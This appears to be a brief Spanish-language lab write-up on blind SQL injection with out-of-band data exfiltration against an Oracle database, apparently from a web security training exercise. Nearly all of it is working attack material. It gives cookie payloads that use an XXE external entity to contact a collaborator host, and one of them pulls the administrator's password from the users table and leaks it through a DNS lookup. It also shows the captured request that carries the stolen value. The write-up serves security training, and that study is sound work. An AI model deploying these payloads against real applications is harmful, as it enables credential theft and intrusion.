---
title: "17 - Blind SQL injection with out-of-band data exfiltration"
---

# 17 - Blind SQL injection with out-of-band data exfiltration

Oracle :
```R
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//bixkdbjkewy7v26t6d9ep4em9df73zunj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Query para enviar consultas por http aprovechándose de XXE :

```R
Cookie: TrackingId=etAMxiggOe3gdB3i'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.q6xz1q7z2bmmjhu8usxtdj21xs3mret2i.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Petición recibida

```request
GET / HTTP/1.0
Host: s9zz7w8e15przthczh5p.q6xz1q7z2bmmjhu8usxtdj21xs3mret2i.oastify.com
Content-Type: text/plain; charset=utf-8
```
